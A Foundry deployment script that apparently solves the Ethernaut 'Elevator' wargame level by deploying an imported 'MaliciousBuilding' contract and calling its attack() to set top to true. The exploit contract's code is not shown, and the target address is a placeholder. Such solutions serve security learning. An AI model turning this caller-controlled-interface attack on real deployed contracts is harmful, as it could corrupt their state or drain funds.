// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Elevator/Elevator.sol";
import "../src/Elevator/MaliciousBuilding.sol";

contract ElevatorSolution is Script {
    Elevator public elevatorInstance = Elevator(<0xYourElevatorContractAddressHere>); 

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Before attack, Top:", elevatorInstance.top());
        console.log("Before attack, Floor:", elevatorInstance.floor());

        // Malicious Building deploy 
        MaliciousBuilding malicious = new MaliciousBuilding(elevatorInstance);
        malicious.attack();

        console.log("After attack, Top:", elevatorInstance.top());  // true
        console.log("After attack, Floor:", elevatorInstance.floor());  // 1

        vm.stopBroadcast();
    }
}